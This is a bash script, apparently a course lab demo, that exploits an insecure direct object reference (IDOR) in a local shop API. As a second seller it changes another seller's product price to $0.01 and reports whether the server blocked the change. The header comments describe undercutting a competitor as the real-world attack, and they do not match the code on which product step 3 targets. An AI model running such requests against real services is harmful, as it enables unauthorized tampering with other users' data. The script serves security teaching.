#!/usr/bin/env bash
#
# Chapter 13 — IDOR on product price update
#
# 1. Login as the seller account
# 2. PATCH the keyboard product (owned by the same seller) to $1 — should succeed
# 3. PATCH the monitor product to $0.01 — vulnerable: succeeds, fixed: 403
#
# In a real attack the seller picks a competitor's high-margin product and
# undercuts it to a self-destructive price.

set -euo pipefail
API="${API:-http://localhost:8080}"
KEYBOARD='aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa'   # owned by seller@example.com
MONITOR='cccccccc-cccc-cccc-cccc-cccccccccccc'    # ALSO owned by seller in seed data

bold() { printf '\033[1m%s\033[0m\n' "$*"; }
gray() { printf '\033[90m%s\033[0m\n' "$*"; }

# To make this a clear cross-seller demo, we register a second seller and
# attempt to edit a product owned by the first.
bold "[1/3] Login as seller (owns the keyboard, the monitor — and everything else in seed)"
LOGIN=$(curl -sS -X POST "${API}/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"seller@example.com","password":"seller123!"}')
TOKEN=$(echo "$LOGIN" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo

bold "[2/3] As alice (USER role, NOT a seller), try to edit the keyboard"
ALICE=$(curl -sS -X POST "${API}/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"alice@example.com","password":"alice123!"}')
ATOKEN=$(echo "$ALICE" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

ROLE_RESP=$(curl -sS -o /tmp/r.json -w '%{http_code}' \
  -X PATCH "${API}/api/products/${KEYBOARD}/price" \
  -H "Authorization: Bearer ${ATOKEN}" \
  -H 'Content-Type: application/json' \
  -d '{"price": 0.01}')
echo "  HTTP ${ROLE_RESP} (alice has USER role, should be 403 from @PreAuthorize)"
echo

bold "[3/3] As seller, try to edit a product owned by ANOTHER seller"
# We need a product owned by someone else. Promote alice to a seller via DB
# would be needed for a perfect demo — instead we run the inverse: create
# a new seller, have them try to edit seller@example.com's keyboard.
echo "  Quick setup: register a second seller account 'mallory'"
curl -sS -X POST "${API}/api/auth/register" \
  -H 'Content-Type: application/json' \
  -d '{"email":"mallory@example.com","password":"mallory123!","role":"SELLER"}' \
  -o /dev/null || true
MAL=$(curl -sS -X POST "${API}/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"mallory@example.com","password":"mallory123!"}')
MTOKEN=$(echo "$MAL" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('token',''))")
if [ -z "$MTOKEN" ]; then
  echo "  Could not log in as mallory — registration endpoint may not be enabled."
  echo "  Skipping the cross-seller attack. Re-run this when you've added a"
  echo "  second seller manually via the database or a custom seed."
  exit 0
fi

gray "  PATCH ${API}/api/products/${KEYBOARD}/price  (as mallory, owner is seller@)"
RESP=$(curl -sS -o /tmp/r.json -w '%{http_code}' \
  -X PATCH "${API}/api/products/${KEYBOARD}/price" \
  -H "Authorization: Bearer ${MTOKEN}" \
  -H 'Content-Type: application/json' \
  -d '{"price": 0.01}')
echo "  HTTP ${RESP}"
echo "  Body: $(cat /tmp/r.json)"
echo

if [ "$RESP" = "403" ]; then
  bold "ATTACK BLOCKED — server enforced ownership check."
elif [ "$RESP" = "200" ]; then
  bold "ATTACK SUCCEEDED — mallory dropped a competitor's product to \$0.01."
  echo "  This is the IDOR write variant — Etsy-class bug, OWASP API #1."
  exit 1
else
  bold "Unexpected response (${RESP})."
fi
